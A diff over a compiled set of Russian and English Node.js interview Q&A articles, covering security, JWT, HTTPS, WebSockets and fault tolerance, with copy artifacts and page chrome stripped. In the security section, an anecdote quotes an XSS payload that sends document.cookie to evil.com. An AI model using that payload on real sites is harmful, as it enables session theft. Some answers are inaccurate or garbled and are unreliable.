 res.send(`Привет, ${escapeHtml(username)}!`);
 3. Небезопасная десериализация:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
+
 // Уязвимый код
 const obj = JSON.parse(data);  // OK для JSON
 const obj = eval('(' + data + ')');  // Крайне небезопасно!
  
 // Для других форматов используйте проверенные библиотеки
 4. Отсутствие проверки зависимостей — регулярно аудитируйте пакеты:
-BashСкопировано
-1
-2
+Bash
 npm audit
 npm audit fix
 5. Exposure of Sensitive Information — не хардкодьте пароли/токены:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
+
 // Плохо
 const password = 'SuperSecret123';
  
 // Хорошо
 const password = process.env.DB_PASSWORD;
 6. Broken Authentication — используйте proven libraries:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
+
 // Хеширование пароля
 const bcrypt = require('bcrypt');
 const hashedPassword = await bcrypt.hash(password, 10);
@@ -2847,16 +2005,7 @@ const hashedPassword = await bcrypt.hash(password, 10);
 // Сравнение
 const match = await bcrypt.compare(password, hashedPassword);
 7. Неправильные настройки CORS:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
+
 // Слишком разрешительные настройки
 app.use(cors());  // Разрешает все домены
  
@@ -2868,11 +2017,6 @@ app.use(cors({
 }));
 Помню, как мы однажды словили XSS-уязвимость в продакшене, просто забыв отсанитизировать текст комментариев перед выводом. Один "умный" пользователь вставил <script>document.location='https://evil.com?cookie='+document.cookie</script>, и понеслась... С тех пор мы используем CSP (Content Security Policy) для всех проектов:
 
-JavaScriptСкопировано
-1
-2
-3
-4
 app.use((req, res, next) => {
   res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self'");
   next();
@@ -2882,25 +2026,7 @@ app.use((req, res, next) => {
 Ответ: Безопасная обработка пользовательского ввода — фундаментальный принцип веб-безопасности. В Node.js это включает:
 
 1. Валидация и санитизация на сервере (никогда не доверяйте фронтенду):
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
+
 const { body, validationResult } = require('express-validator');
  
 app.post('/user',
@@ -2932,30 +2058,12 @@ User.findOne({ username: username })  // Параметры автоматиче
 // Vanilla SQL
 connection.query('SELECT * FROM users WHERE id = ?', [userId]);
 3. Ограничение размера запросов для предотвращения DoS-атак:
-JavaScriptСкопировано
-1
-2
-3
+
 const bodyParser = require('body-parser');
 app.use(bodyParser.json({ limit: '1mb' }));
 app.use(bodyParser.urlencoded({ limit: '1mb', extended: true }));
 4. Проверка загружаемых файлов — типы, размеры, содержимое:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
+
 const multer = require('multer');
 const upload = multer({
   limits: { fileSize: 5 * 1024 * 1024 },  // 5MB
@@ -2980,29 +2088,7 @@ app.post('/upload', upload.single('avatar'), (req, res) => {
 1. Получите SSL-сертификат — коммерческий или бесплатный (Let's Encrypt)
 
 2. Создайте HTTPS-сервер:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
+
 const https = require('https');
 const fs = require('fs');
 const express = require('express');
@@ -3026,18 +2112,7 @@ https.createServer(options, app).listen(443, () => {
   console.log('HTTPS сервер запущен на порту 443');
 });
 3. Перенаправление с HTTP на HTTPS:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
+
 const http = require('http');
 const express = require('express');
  
@@ -3050,11 +2125,7 @@ httpApp.all('*', (req, res) => {
  
 http.createServer(httpApp).listen(80);
 4. Настройка HSTS для дополнительной безопасности:
-JavaScriptСкопировано
-1
-2
-3
-4
+
 app.use((req, res, next) => {
   res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
   next();
@@ -3067,38 +2138,10 @@ app.use((req, res, next) => {
 Реализация JWT в Node.js обычно включает следующие шаги:
 
 1. Установка зависимостей:
-BashСкопировано
-1
+
 npm install jsonwebtoken bcrypt
 2. Создание токена при аутентификации:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
+
 const jwt = require('jsonwebtoken');
 const bcrypt = require('bcrypt');
  
@@ -3127,29 +2170,7 @@ app.post('/login', async (req, res) => {
   res.json({ token });
 });
 3. Создание middleware для защиты маршрутов:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
+
 function authenticateToken(req, res, next) {
   const authHeader = req.headers['authorization'];
   const token = authHeader && authHeader.split(' ')[1];  // Bearer TOKEN
@@ -3173,20 +2194,7 @@ app.get('/protected', authenticateToken, (req, res) => {
   res.json({ message: `Привет, ${req.user.username}!` });
 });
 4. Реализация middleware для проверки ролей:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
+
 function authorizeRole(role) {
   return (req, res, next) => {
     if (req.user.role !== role) {
@@ -3214,26 +2222,7 @@ app.get('/admin', authenticateToken, authorizeRole('admin'), (req, res) => {
 - Stateless архитектура (состояние хранится вне приложения).
 - Распределенное кэширование (Redis, Memcached).
 3. Микросервисная архитектура — разделение монолита на отдельные сервисы:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
+
 // Сервис пользователей
 const express = require('express');
 const app = express();
@@ -3254,42 +2243,7 @@ app.get('/api/products/:id', async (req, res) => {
  
 app.listen(3002);
 4. Асинхронная обработка с очередями сообщений:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
+
 // Отправка задачи в очередь
 const amqp = require('amqplib');
  
@@ -3333,27 +2287,6 @@ async function processQueue() {
 
 Я как-то работал с проектом, где мы начали с монолита на одном сервере. Когда нагрузка выросла, мы попробовали просто добавить больше серверов... и все развалилось. Почему? Потому что сессии хранились в памяти процесса, и пользователи перенаправлялись на разные серверы! Решением стало вынесение сессий в Redis:
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
 const session = require('express-session');
 const RedisStore = require('connect-redis').default;
 const { createClient } = require('redis');
@@ -3382,50 +2315,7 @@ app.use(session({
 Пример с Socket.IO:
 
 1. Настройка сервера:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38
-39
-40
-41
-42
-43
+
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
@@ -3470,50 +2360,7 @@ server.listen(3000, () => {
   console.log('Сервер запущен на порту 3000');
 });
 2. Клиентский код (front-end):
-HTML5Скопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38
-39
-40
-41
-42
-43
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -3558,31 +2405,7 @@ HTML5Скопировано
 </body>
 </html>
 3. Масштабирование WebSocket приложений с Redis:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
+
 const express = require('express');
 const { createServer } = require('http');
 const { Server } = require('socket.io');
@@ -3614,19 +2437,7 @@ WebSocket может существенно улучшить опыт польз
 Ответ: Отказоустойчивость — способность системы продолжать работу при сбоях. Для Node.js приложений это включает:
 
 1. Перехват и обработка необработанных исключений:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
+
 // Глобальные обработчики ошибок
 process.on('uncaughtException', (err) => {
   console.error('Необработанное исключение:', err);
@@ -3640,15 +2451,7 @@ process.on('unhandledRejection', (reason, promise) => {
   console.error('Необработанный reject промиса:', reason);
 });
 2. Автоматический перезапуск упавших процессов с PM2:
-BashСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
+
 # Установка PM2
 npm install pm2 -g
  
@@ -3658,31 +2461,7 @@ pm2 start app.js --name "my-app" --max-memory-restart 300M
 # Кластерный режим для отказоустойчивости и балансировки
 pm2 start app.js -i max
 3. Graceful shutdown — корректное завершение работы:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
+
 function gracefulShutdown() {
   console.log('Запуск корректного завершения');
   
@@ -3708,32 +2487,7 @@ function gracefulShutdown() {
 process.on('SIGTERM', gracefulShutdown);
 process.on('SIGINT', gracefulShutdown);
 4. Circuit Breaker — паттерн для предотвращения каскадных отказов:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
+
 const CircuitBreaker = require('opossum');
  
 // Создание circuit breaker для внешнего API
@@ -3760,42 +2514,7 @@ app.get('/api/data', async (req, res) => {
   }
 });
 5. Использование очередей для критически важных операций:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
+
 // Повторная отправка при сбое
 const amqp = require('amqplib');
  
@@ -3841,28 +2560,6 @@ async function sendToQueue(data, maxRetries = 3) {
 
 Интервьюеры любят просить написать собственный middleware, например, для измерения производительности:
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
 function responseTimeMiddleware(req, res, next) {
   // Сохраняем время начала запроса
   const start = process.hrtime();
@@ -3890,89 +2587,6 @@ app.use(responseTimeMiddleware);
 
 А вот задача посложнее — реализовать самоочищающийся кэш с защитой от утечек памяти:
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38
-39
-40
-41
-42
-43
-44
-45
-46
-47
-48
-49
-50
-51
-52
-53
-54
-55
-56
-57
-58
-59
-60
-61
-62
-63
-64
-65
-66
-67
-68
-69
-70
-71
-72
-73
-74
-75
-76
-77
-78
-79
-80
-81
-82
 class AutoCleanCache {
   constructor(maxSize = 100, cleanInterval = 60000) {
     this.cache = new Map();
@@ -4071,29 +2685,6 @@ cache.set('user:1', { name: 'John' });
 
 Давайте соединим вместе все концепции, которые мы разобрали, и создадим полное рабочее приложение. Это будет API сервер для блога с аутентификацией, обработкой статей и комментариев, а также WebSocket уведомлениями о новых комментариях. Структура проекта:
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
 blog-api/
 ├── config/
 │   ├── database.js
@@ -4119,34 +2710,7 @@ blog-api/
 Начнем с базовых файлов:
 
 package.json
-JSONСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
+
 {
   "name": "blog-api",
   "version": "1.0.0",
@@ -4175,87 +2739,7 @@ JSONСкопировано
   }
 }
 server.js - точка входа, запускает сервер:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38
-39
-40
-41
-42
-43
-44
-45
-46
-47
-48
-49
-50
-51
-52
-53
-54
-55
-56
-57
-58
-59
-60
-61
-62
-63
-64
-65
-66
-67
-68
-69
-70
-71
-72
-73
-74
-75
-76
-77
-78
-79
-80
+
 require('dotenv').config();
 const http = require('http');
 const app = require('./app');
@@ -4337,46 +2821,7 @@ process.on('unhandledRejection', (reason, promise) => {
   logger.error('Необработанный reject промиса:', reason);
 });
 app.js - настройка Express приложения:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38
-39
+
 const express = require('express');
 const cors = require('cors');
 const helmet = require('helmet');
@@ -4425,22 +2870,11 @@ WebSocket для коммуникации в реальном времени.
 Маршрутизация и middleware.
 Расширять такое приложение легко — до
 
-Node JS Interview Question
-Last updated on Jan 09, 2024
 
-author-image
-by Amani
+Node JS Interview Question
+
 Node JS is a powerful JavaScript framework that enables developers to create scalable network applications. As such, Node JS is becoming increasingly popular, and accordingly, interviewers are starting to ask more questions about it. This article provides a list of some common Node JS interview questions, which will help you prepare for your next interview.
 
-Most Frequently Asked Node JS Interview Questions and Answers
-Is Nodejs a language or a framework?
-How can Node.js be used?
-Explain Modules in Node Js.
-Is Node Js Single – threaded?
-Explain the event loop in Node js.
-What is Dispatcher?
-Explain what a javascript engine is.
-Conclusion
 Can you tell me if Nodejs is Synchronous or Asynchronous?
 Node.js is an event-driven asynchronous JavaScript runtime. It is intended for the development of scalable network applications. Because of its asynchronous nature, Node.js is very efficient in handling multiple concurrent connections.
 
@@ -4448,7 +2882,6 @@ Can you explain how Node js handles multiple requests concurrently despite being
 It can handle multiple requests concurrently because of its event-driven, non-blocking I/O model. Node.js can process requests as they come in without waiting for each request to finish before starting on the next one.
 
 Node.js uses a thread pool to handle certain types of tasks that are computationally intensive or blocking.
-
 
 Is Nodejs a language or a framework?
 Node.js is a programming platform that enables developers to create network and server-side applications. Node.js apps are developed in Javascript and run in the Node.js runtime on S X, Linux and MS Windows.' Java Script modules that are used to create various applications.
@@ -4539,7 +2972,6 @@ The best way to stop a controller process without suspending all child processes
 . What does Emitter do?
 An emitter is a tool that helps you to create and manage events. It is used to create custom events and event handlers.
 
-
 . What is Dispatcher?
 The dispatcher is a software component responsible for handling the communication between various software components in a computer system. It acts as an intermediary between the different components and ensures that the data is transferred smoothly and efficiently. 
 
@@ -4582,19 +3014,9 @@ The number data type in Node.js represents a double-precision 64-bit binary numb
 The number data type is a double-precision 64-bit binary number. Node.js does not have a separate integer data type.
 
 
-Conclusion
-These questions are designed to help you better understand Node JS and what it can do for your business. With these questions, you should be able to get a feel for the potential this technology has. If you're looking to get started with Node JS, be sure to check out our other resources to get the most out of this powerful tool.
-
-Top 50 Node.Js Interview Questions and Answers
-Node JS
-Rajesh Kumar
-·
-February 11, 2022
-·
-0 Comment
 What is Node.js? Where can you use it?
 Introduction to the Node.js reference architecture, Part 1: Overview | Red  Hat Developer
-Node.Js
+
 Node.js is an open-source, cross-platform JavaScript runtime environment and library to run web applications outside the client’s browser. It is used to create server-side web applications.
 
 Node.js is perfect for data-intensive applications as it uses an asynchronous, event-driven model. You can use I/O intensive web applications like video streaming sites. You can also use it for developing: Real-time web applications, Network applications, General-purpose applications, and Distributed systems.
@@ -5049,51 +3471,8 @@ In case you are facing any challenges with these Node.js Interview Questions, pl
 50. Does node run on windows?
 
 Yes – it does.
+
 	
-
-What is a Node js Developer:
-Node Js developers are IT professionals responsible for designing, developing, and testing Node Js applications. Node Js developers typically work on web applications that leverage Node Js frameworks, such as Express.js and Sails.js. They handle Node Js development tasks like API integration, server configuration, debugging, and unit testing.
-
-Node js Developer Qualifications
-Hiring Node Js developers requires a keen eye for Node Js qualifications. Node Js developers should have the following minimum qualifications:
-
-Bachelor's degree in Information Technology or Computer Science
-Some years of experience working with Node Js
-Experience developing Node Js applications with Node Js frameworks
-Proficiency with Node Js databases, web servers, and cloud platforms
-Knowledge of Node Js package managers and build tools
-Strong understanding of Node Js concepts, such as asynchronous programming and event-driven architecture
-Excellent debugging and troubleshooting skills
-Strong analytical and problem-solving skills
-Good communication and collaboration skills
-Additionally, Node js developers are often required to have a working knowledge of the following:
-
-Node js frameworks such as Express and Hapi
-Node js databases such as MongoDB and CouchDB
-Node js web servers such as Apache and Nginx
-Node js cloud platforms such as Amazon Web Services and Azure
-Node js package managers such as NPM and Yarn
-What Does a Node js Developer Do
-It's important to understand the roles and responsibilities of Node Js developers so you can make sure they have what it takes to excel in their role and also ask relevant Node Js interview questions. Generally, Node Js developers have the following roles and responsibilities:
-
-Developing and maintaining all server-side network components
-Integrating user-facing web components with server-side logic
-Designing and developing web applications using Node Js frameworks
-Writing efficient code that follows best practices
-Testing web applications and debugging errors
-Optimizing web application performance
-Collaborating with front-end developers to ensure web applications are properly integrated
-Maintaining web servers and databases
-Updating web applications as needed with new features, security patches, and bug fixes
-Node js Interview Questions with Answers
-Let's dive into Node Js interview questions and answers. We'll discuss these questions in three categories:
-
-Junior/ Entry-level/ Fresher
-Mid-level/ Intermediate
-Senior/ Advanced
-Junior Node Js Interview Questions
-These Node Js interview questions are for candidates starting out in web development and Node Js. They may have just cleared college or be in the early stages of their web development career.
-
 What is Node Js?
 Node Js is a JavaScript-based programming language that allows web developers to build web applications. It's an open-source runtime environment powered by the Google Chrome V8 JavaScript engine and uses a non-blocking I/O model and event-driven architecture.
 
@@ -5191,16 +3570,6 @@ Garbage collection is a process used by v8 to reclaim memory from unused objects
 What are the different types of errors in Node Js?
 The different types of errors in Node Js include syntax errors, runtime errors, and logical errors. Syntax errors occur when the code does not conform to the syntax of the language. Runtime errors occur when a program is executing and an unexpected error occurs. Logical errors occur when the written code is correct but produces an incorrect result. Developers can debug and test these errors using the Node Js error handling functions. These include try/catch blocks, the error-first callback pattern, and Promises.
 
-ire Jobs Contact Sign in Post a role →
-
-← All posts
-Engineering
-33 Node.JS Interview Questions and Answers to Ask Aspiring Node Developers
-Viki Kovalenko June 1, 2021
-$(document).on('turbolinks:load', function(){hljs.highlightAll()});
-The interview round is a vital part of any recruitment process. Employers need to ask the right questions to candidates during the interview to screen for essential skills. The same applies to hiring Node.js developers, where interview questions are fundamental for assessing technical prowess.
-
-In this post, we will present the top NodeJS interview questions to ask your potential developer. We will sort the questions into three expertise levels (basic, intermediate, and advanced) for more convenience.
 
 Basic Level Node Interview Questions
 Basic level questions are for developers who are starting out. You need to ask them simple questions that revolve around what is Node JS and how it works. The questions help employers determine the depth of understanding of the aspirant and if they are suitable for the role.
@@ -5499,22 +3868,9 @@ Answer:
 
 We can start with a code review to handle maintenance issues. Using microservices and working to improve code quality can also help. We can also aim for better documentation and update the whole stack.
 
-Final Thoughts
-Node JS interview questions help employers assess the skills and technical capabilities of aspiring developers. You can ask questions we listed based on the level of your candidates and experience. Make your screening process count to get the most promising candidates for the interview round. You can then use our interview questions to select your new Node developer.
 
-7 Hardest Node.js Interview Questions & Answers
-#
-node
-#
-interview
-#
-questions
-#
-fullstack
-7 Hardest Node.js Interview Questions & Answers
+
 Node.js is an open-source, cross-platform JavaScript run-time environment that executes JavaScript code server-side. Node.js lets developers use JavaScript for server-side scripting—running scripts server-side to produce dynamic web page content before the page is sent to the user's web browser.
-
-🔴 Originally published on FullStack.Cafe - Kill Your Tech & Coding Interview
 
 Q1: Provide some example of config file separation for dev and prod environments
 Topic: Node.js
@@ -5684,25 +4040,6 @@ async function loginController() {
   }
 }
 
-Десять вопросов о Node.js, на которые вы не сможете ответить
-6 мин
-66K
-Блог компании RUVDS.com
-JavaScript
-*
-Node.JS
-*
-Веб-разработка
-*
-Перевод
-Автор оригинала: Samer Buna
-В этом году, на конференции Forward.js, посвящённой JavaScript, я выступал с докладом «You don’t know Node». Во время выступления я задал аудитории несколько вопросов о Node, и большинство присутствующих не смогли ответить на многие из них. А ведь мой доклад слушали технические специалисты. Никаких подсчётов я не производил, но выглядело всё именно так, да и несколько слушателей, которые подошли ко мне после выступления, это подтвердили.
-
-
-
-Проблема, которая заставила меня сделать то выступление, заключается в том, что, по-моему, система обучения Node выстроена неправильно. Большинство учебных материалов сосредоточено на пакетах Node, но не на самой платформе. Часто этих пакеты служат обёртками для модулей Node (вроде http или stream). Как результат, тот, кто не знает Node и сталкивается с проблемой, источником которой может оказаться не некий пакет, а платформа, оказывается в крайне невыгодном положении.
-
-Я выбрал несколько вопросов и ответов с той конференции и включил их в эту статью. Сами вопросы представлены в заголовках разделов статьи. Попытайтесь, прочтя вопрос, не читать дальше, а сначала мысленно на него ответить. Если вы найдёте ошибку в моих ответах — пожалуйста дайте мне знать.
 
 Вопрос №1. Что такое стек вызовов и является ли он частью движка V8?
 
@@ -5841,22 +4178,9 @@ require('./module1');
 
 Однако, если вы пользуетесь синхронными методами внутри обработчиков неких событий, вроде коллбэка HTTP-сервера, отвечающего за обработку запросов, то это, без вариантов, совершенно неправильно. Делать так настоятельно не рекомендуется.
 
-Итоги
 
-Надеюсь, вы смогли ответить на все эти вопросы, или, по крайней мере, на некоторые из них.
-
-Уважаемые читатели! Если бы вы оказались на конференции по JS, на месте автора этой статьи, какие вопросы по Node.js вы задали бы аудитории?
-
-Top 50 Node.Js Interview Questions and Answers
-Node JS
-Rajesh Kumar
-·
-February 11, 2022
-·
-0 Comment
 What is Node.js? Where can you use it?
-Introduction to the Node.js reference architecture, Part 1: Overview | Red  Hat Developer
-Node.Js
+
 Node.js is an open-source, cross-platform JavaScript runtime environment and library to run web applications outside the client’s browser. It is used to create server-side web applications.
 
 Node.js is perfect for data-intensive applications as it uses an asynchronous, event-driven model. You can use I/O intensive web applications like video streaming sites. You can also use it for developing: Real-time web applications, Network applications, General-purpose applications, and Distributed systems.
@@ -5977,7 +4301,6 @@ Code language: JavaScript (javascript)
 ___________________________________________
 
 17. How many types of API functions are there in Node.js?
-
 
 API functions are available in Nodes.Js
 There are two types of API functions:
@@ -6312,22 +4635,6 @@ In case you are facing any challenges with these Node.js Interview Questions, pl
 
 Yes – it does.
 
-Подбор Node js
-Согласно статистике, Node.js повышает производительность на 50% и снижает затраты на разработку на 58%. Более 28 000 веб-сайтов в США используют эту платформу, включая такие известные сервисы, как Paypal, Netflix, LinkedIn, Reddit, Medium, eBay и другие.
-
-Нет никаких сомнений в том, что Node.js это отличный выбор. Чтобы создать свое решение с использованием этой технологии, вам нужна сильная команда. Если вы являетесь владельцем продукта, не обладающим техническими знаниями или обладаете ограниченными знаниями об этой структуре, вы можете столкнуться с трудностями при поиске подходящих разработчиков.
-
-В этой статье мы приводим список вопросов и ответов для Node.js собеседования, которые помогут вам оценить технические знания ваших кандидатов. Продолжайте читать, чтобы узнать больше.
-
-Подготовка к собеседованию:
-
-Прежде чем перейти к списку вопросов, давайте проясним ключевые моменты, которые необходимо учитывать во время собеседования. Прежде всего, важно ознакомиться с биографией вашего потенциального сотрудника. Мы предлагаем использовать вопросы для интервью с разработчиком программного обеспечения, которые идеально подходят для обсуждения общих терминов информатики.
-
-Когда дело доходит до Node.js задавайте вопросы для интервью, придерживайтесь тем высокого уровня. Вы не можете быть уверены, что выбрали правильного специалиста строго по вопросам собеседования, но вы можете оценить их технические способности. Помните, что код — это не единственная часть собеседования. Вам также необходимо определить, будет ли с кандидатом легко или трудно работать.
-
-13 Лучших вопросов и ответов для интервью на JavaScript:
-
-Как упоминалось ранее, Node.js это фреймворк, который в основном работает на JavaScript. Итак, если вы хотите отобрать лучших специалистов, вам следует начать с оценки их навыков программирования на JavaScript. Для этой цели используйте следующий список вопросов для интервью JS. Подробнее о собеседовании по JavaScript вы можете прочитать в статье.
 
 Назовите и сравните различные парадигмы программирования. К какому из них относится JavaScript?
 Парадигма программирования — это набор идей и концепций для языков программирования. Существует две основные парадигмы: объектно-ориентированное программирование (ООП) и функциональное программирование (ФП).
@@ -6359,9 +4666,6 @@ JavaScript не является ни чисто объектно-ориенти
 Что такое каррирование (Currying)? Когда его используют? Каррирование — это техника преобразования функции с несколькими аргументами в последовательность функций с одним аргументом. Сначала функция принимает один аргумент и возвращает новую функцию, которая принимает следующий аргумент и так далее. Этот процесс продолжается до тех пор, пока не будут переданы все аргументы, и функция выполняет свою основную задачу.
 Каррирование особенно полезно в ситуациях, когда у вас есть функция с множеством аргументов, и вы хотите предоставить возможность частичной применения аргументов или создания новых функций на основе существующей. Это может быть полезно для создания обобщенных функций или улучшения читаемости кода.
 
-15 Основных Вопросов и Ответов на Собеседовании по Node.js:
-
-После освоения основ JavaScript перейдем к самому важному разделу — вопросам для собеседования по Node.js. Если вы стремитесь привлечь топовых специалистов, уделите внимание следующим вопросам:
 
 Что такое Node.js?
 Node.js — это не язык программирования, а кросс-платформенный фреймворк с открытым исходным кодом. Он был создан в 2009 году Райаном Далом и расширил применение JavaScript на серверную сторону. Это позволяет использовать JavaScript для создания высокопроизводительных веб-приложений и других приложений.
@@ -6419,174 +4723,6 @@ const crypto = require(‘crypto’); let message = «I love node and express.js
 
 Этот код создаст MD5-хеш от строки message и выведет его в шестнадцатеричном формате.
 
-
-Заключение
-Проведение успешного интервью с кандидатами для позиции Node.js разработчика требует хорошего понимания основ этой технологии и умения задавать релевантные вопросы. Наши вопросы и ответы предоставляют базовую основу для определения технических знаний и навыков кандидата, а также его способности решать сложные задачи в асинхронной среде.
-
-Не забывайте, что поиск it-специалистов может быть вызовом, но вы можете облегчить этот процесс, обратившись к платформам, таким как Jobers. Jobers предоставляет доступ к широкому кругу специалистов и помогает свести время поиска кандидатов к минимуму, чтобы вы могли сфокусироваться на развитии вашего проекта и бизнеса. Не забывайте использовать все доступные ресурсы, чтобы собрать сильную команду и достичь успеха в разработке приложений на Node.js.
-
-
-ОСТАВИТЬ ЗАЯВКУ
-Смотрите также
-
-5 мин
-3637196
-04.08.2024
-Как определить цель компании
-Правильно определённая цель может стать рулевым колесом, которое направит ваш бизнес к успеху в штормовом море рыночной конкуренции.
-
-Читать статью
-
-5 мин
-3346334
-04.08.2024
-Как создать и зачем нужна корпоративная база знаний
-Этот инструмент превращает информационный хаос в организованную систему, где каждая важная деталь доступна в пару кликов. Это не только экономит время, но и снижает стресс у вашей команды, ведь теперь они точно знают, где и что искать.
-
-Читать статью
-
-5 мин
-3331811
-04.08.2024
-Как разработать оргструктуру компании
-Этот инструмент превращает информационный хаос в организованную систему, где каждая важная деталь доступна в пару кликов. Это не только экономит время, но и снижает стресс у вашей команды, ведь теперь они точно знают, где и что искать.
-
-Читать статью
-
-5 мин
-3698352
-04.08.2024
-Теория ожидания Врума
-Понимание того, что движет вашими сотрудниками, может стать вашим мощным инструментом в управлении командой. Именно здесь на помощь приходит теория ожидания Виктора Врума, один из фундаментальных подходов в психологии мотивации, который помогает расшифровать, как и почему ваша команда работает так, как работает.
-
-Читать статью
-
-4 мин
-3692656
-03.08.2024
-Аудит человеческих ресурсов
-Подумайте об этом как о стратегическом инструменте, который не только выявляет проблемы, но и предлагает конкретные пути их решения. Это возможность переосмыслить процессы, которые кажутся обыденными, но на деле могут таить в себе ключ к более продуктивной рабочей атмосфере.
-
-Читать статью
-
-3 мин
-4370828
-23.07.2024
-Профиль должности маркетолога
-Маркетолог — это много больше, чем просто креативный ум, погружённый в мир рекламы и соцсетей. Это стратег, который каждый день стоит у руля вашего бренда, направляя его через бурные воды рыночной конкуренции.
-
-Читать статью
-
-3 мин
-4357062
-23.07.2024
-Профиль должности бухгалтера
-Задумывались ли вы когда-нибудь, что стоит за спокойствием и уверенностью вашего предприятия в финансовом плане? Правильный ответ — ваш бухгалтер. Это специалист, который не только следит за каждым рублем в бюджете, но и защищает ваш бизнес от финансовых рисков.
-
-Читать статью
-
-3 мин
-4344191
-23.07.2024
-Профиль должности администратора
-Администратор — это многофункциональный организатор и первое лицо компании для ваших клиентов и партнеров. Это человек, который знает всё о том, как устроены ваши процессы, и способен управлять ими одним движением руки.
-
-Читать статью
-
-3 мин
-4331662
-23.07.2024
-Профиль должности hr-менеджера
-Если вы до сих пор не задумывались о значении этой роли, то пришло время взглянуть на профиль должности HR-менеджера под новым углом. От того, насколько грамотно организована работа вашего HR, зависит не только атмосфера в коллективе, но и его способность достигать амбициозных целей. 
-
-Читать статью
-
-3 мин
-4318456
-23.07.2024
-Профиль должности инженера
-Инженеры — это не просто специалисты в своем деле, это строители будущего в буквальном смысле этого слова. Вашему вниманию предлагается статья, которая раскроет вам все тонкости профиля должности инженера.
-
-Читать статью
-начните сейчас
-
-Звоните, поможем быстро найти сотрудников
-
-8 (800) 707-63-78
-Max
-Telegram
-
-Сервис публикации вакансий
-
-Реквизиты
-
-ООО «ЭЙЧАР-СОФТ», ИНН: 7805815915 198035, г. Санкт-Петербург, вн.тер.г. Муниципальный Округ Морские Ворота, ул Двинская, д. 10, к. 2, литера А, помещ. 16-Н 8(800) 707-63-78
-Код вида деятельности: 1.01, 2.01
-Основной ОКВЭД: 62.01
-
-Ваш регион
-
-Москва
-Закрывающие документы:
-
-buh@jobers.ru
-Отдел продаж:
-
-8(800) 707-63-78
-sales@jobers.ru
-В реестре
-российского ПО
-
-  
-© 2016-2026 Jobers.ru
-
-Продукты
-
-Публикация вакансий
-Публикация во Вконтакте
-Публикация в Telegram
-Рерайтинг вакансии
-Сервис
-
-Контакты
-Способы оплаты
-Отзывы
-О компании
-Наши партнеры
-Аккредитация
-Документы
-
-Политика конфиденциальности
-Оферта
-Правила использования сайта
-Правила размещения
-Использование cookies
-Стоимость ПО
